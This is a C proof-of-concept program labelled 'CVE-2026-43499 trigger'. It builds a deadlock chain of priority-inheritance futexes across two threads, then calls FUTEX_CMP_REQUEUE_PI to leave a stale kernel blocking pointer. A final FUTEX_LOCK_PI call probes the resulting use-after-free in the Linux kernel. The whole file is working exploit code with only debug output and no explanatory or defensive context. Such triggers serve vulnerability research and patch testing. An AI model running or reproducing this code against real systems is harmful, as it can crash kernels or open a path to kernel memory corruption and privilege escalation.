#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <time.h>
#include <sys/syscall.h>

#ifndef SYS_futex
#define SYS_futex 98
#endif

#ifndef FUTEX_WAIT
#define FUTEX_WAIT 0
#define FUTEX_WAKE 1
#define FUTEX_LOCK_PI 6
#define FUTEX_UNLOCK_PI 7
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI 12
#define FUTEX_PRIVATE_FLAG 128
#endif

#define FLPI (FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG)
#define FUPI (FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG)
#define FWRQ (FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG)
#define FCRQ (FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG)

static uint32_t futex1 = 0;
static uint32_t futex2 = 0;
static uint32_t cycle_futex = 0;

static volatile int o_ready = 0;
static volatile int w_ready = 0;
static volatile int o_blocking = 0;
static volatile int w_waiting = 0;
static volatile int uaf_probe = 0;

static long xfutex(uint32_t *u, int op, uint32_t val,
                   void *ts, uint32_t *u2, uint32_t v3)
{
    return syscall(SYS_futex, u, op, val, ts, u2, v3);
}

static void dbg(const char *s) { write(2, s, strlen(s)); }

static void dbg_long(const char *prefix, long v, int en)
{
    char buf[128];
    int n = snprintf(buf, sizeof(buf), "%s%ld errno=%d (%s)\n",
                     prefix, v, en, strerror(en));
    write(2, buf, n);
}

static void *owner_fn(void *unused)
{
    (void)unused;
    pid_t tid = (pid_t)syscall(SYS_gettid);

    __atomic_store_n(&futex2, (uint32_t)tid, __ATOMIC_RELEASE);
    __atomic_store_n(&o_ready, 1, __ATOMIC_RELEASE);

    while (!__atomic_load_n(&w_ready, __ATOMIC_ACQUIRE))
        sched_yield();

    __atomic_store_n(&o_blocking, 1, __ATOMIC_RELEASE);
    xfutex(&cycle_futex, FLPI, 0, NULL, NULL, 0);
    xfutex(&cycle_futex, FUPI, 0, NULL, NULL, 0);
    return NULL;
}

static void *waiter_fn(void *unused)
{
    (void)unused;
    pid_t tid = (pid_t)syscall(SYS_gettid);
    struct timespec ts;
    long r;

    while (!__atomic_load_n(&o_ready, __ATOMIC_ACQUIRE))
        sched_yield();

    __atomic_store_n(&cycle_futex, (uint32_t)tid, __ATOMIC_RELEASE);
    __atomic_store_n(&w_ready, 1, __ATOMIC_RELEASE);

    while (!__atomic_load_n(&o_blocking, __ATOMIC_ACQUIRE))
        sched_yield();
    usleep(20000);

    __atomic_store_n(&w_waiting, 1, __ATOMIC_RELEASE);

    clock_gettime(CLOCK_MONOTONIC, &ts);
    ts.tv_sec += 2;

    r = xfutex(&futex1, FWRQ, 0, &ts, &futex2, 0);
    dbg_long("[W] FUTEX_WAIT_REQUEUE_PI returned ", r, errno);

    for (volatile int i = 0; i < 200; i++)
        syscall(SYS_getpid);

    __atomic_store_n(&uaf_probe, 1, __ATOMIC_RELEASE);

    usleep(500000);

    xfutex(&cycle_futex, FUPI, 0, NULL, NULL, 0);
    return NULL;
}

int main(void)
{
    pthread_t oth, wth;

    dbg("CVE-2026-43499 trigger\n");

    pthread_create(&oth, NULL, owner_fn, NULL);
    pthread_create(&wth, NULL, waiter_fn, NULL);

    while (!__atomic_load_n(&w_waiting, __ATOMIC_ACQUIRE))
        sched_yield();
    usleep(40000);

    dbg("[M] deadlock chain: W->futex2(O)->cycle_futex(W)->W\n");
    dbg("[M] firing FUTEX_CMP_REQUEUE_PI\n");

    long ret = xfutex(&futex1, FCRQ,
                      1,
                      (void *)(uintptr_t)1,
                      &futex2,
                      0);
    int err = errno;
    dbg_long("[M] FUTEX_CMP_REQUEUE_PI = ", ret, err);

    if (ret == -1 && err == EDEADLK) {
        dbg("[M] EDEADLK: W->pi_blocked_on is stale — waiting for W timeout\n");

        while (!__atomic_load_n(&uaf_probe, __ATOMIC_ACQUIRE))
            sched_yield();

        dbg("[M] UAF probe: FUTEX_LOCK_PI(cycle_futex)\n");
        xfutex(&cycle_futex, FLPI, 0, NULL, NULL, 0);
        dbg("[M] UAF probe returned\n");
        xfutex(&cycle_futex, FUPI, 0, NULL, NULL, 0);
    }

    pthread_join(wth, NULL);
    pthread_join(oth, NULL);
    return 0;
}